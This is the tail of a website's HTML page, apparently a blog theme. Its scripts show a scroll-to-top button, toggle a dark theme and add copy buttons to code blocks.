        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
